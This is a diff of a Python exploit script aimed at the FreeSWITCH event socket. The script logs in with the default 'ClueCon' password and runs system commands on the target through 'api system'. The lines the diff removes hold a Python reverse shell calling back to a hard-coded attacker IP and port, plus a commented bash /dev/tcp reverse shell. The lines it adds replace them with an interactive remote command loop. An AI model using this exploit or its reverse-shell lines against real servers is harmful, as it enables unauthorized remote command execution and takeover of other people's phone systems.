@@ -4,34 +4,38 @@ from socket import *
 import sys
 
 if len(sys.argv) != 2:
-    print('Missing arguments')
+    print('Missing target address')
     print('Usage: freeswitch-exploit.py <target>')
     sys.exit(1)
 
 ADDRESS = sys.argv[1]
-REVERSE_IP = '192.168.45.193'  # Attacker IP
-REVERSE_PORT = '4444'  # Attacker Port
-PASSWORD = 'ClueCon'  # Default password for FreeSWITCH
+PASSWORD = 'ClueCon'  # default password for FreeSWITCH
 
-# Try the Python reverse shell first
-CMD = f'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{REVERSE_IP}",{REVERSE_PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);\''
-# Alternatively, you can switch to the Bash reverse shell
-# CMD = f'bash -c "bash -i >& /dev/tcp/{REVERSE_IP}/{REVERSE_PORT} 0>&1"'
-
+# Connect to the FreeSWITCH server
 s = socket(AF_INET, SOCK_STREAM)
 s.connect((ADDRESS, 8021))
 
 response = s.recv(1024)
 if b'auth/request' in response:
-    s.send(bytes(f'auth {PASSWORD}\n\n', 'utf8'))
+    # Authenticate with the server
+    s.send(bytes('auth {}\n\n'.format(PASSWORD), 'utf8'))
     response = s.recv(1024)
+    
     if b'+OK accepted' in response:
         print('Authenticated')
-        print(f'Sending command: api system {CMD}')
-        # Sending reverse shell command
-        s.send(bytes(f'api system {CMD}\n\n', 'utf8'))
-        response = s.recv(8096).decode()
-        print(response)
+        
+        # Keep prompting the user for commands until they type 'exit'
+        while True:
+            CMD = input('Enter command (or type "exit" to quit): ')
+            
+            if CMD.lower() == 'exit':
+                print('Exiting...')
+                break
+            
+            # Send the command to the server
+            s.send(bytes('api system {}\n\n'.format(CMD), 'utf8'))
+            response = s.recv(8096).decode()
+            print(response)
     else:
         print('Authentication failed')
         sys.exit(1)
